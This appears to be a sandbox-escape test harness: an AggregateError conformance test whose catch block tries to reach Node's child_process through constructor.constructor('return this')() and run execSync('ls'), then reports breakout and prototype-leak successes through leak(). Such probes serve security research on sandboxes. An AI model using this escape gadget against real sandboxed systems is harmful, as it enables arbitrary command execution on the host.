try {
    var case1 = new AggregateError([], 42);
    verifyProperty(case1, 'message', {
        value: '42',
        writable: true,
        enumerable: false,
        configurable: true
    });
    var case2 = new AggregateError([], false);
    verifyProperty(case2, 'message', {
        value: 'false',
        writable: true,
        enumerable: false,
        configurable: true
    });
    var case3 = new AggregateError([], true);
    verifyProperty(case3, 'message', {
        value: 'true',
        writable: true,
        enumerable: false,
        configurable: true
    });
    var case4 = new AggregateError([], {
        toString() {
            return 'string';
        }
    });
    verifyProperty(case4, 'message', {
        value: 'string',
        writable: true,
        enumerable: false,
        configurable: true
    });
    var case5 = new AggregateError([], null);
    verifyProperty(case5, 'message', {
        value: 'null',
        writable: true,
        enumerable: false,
        configurable: true
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}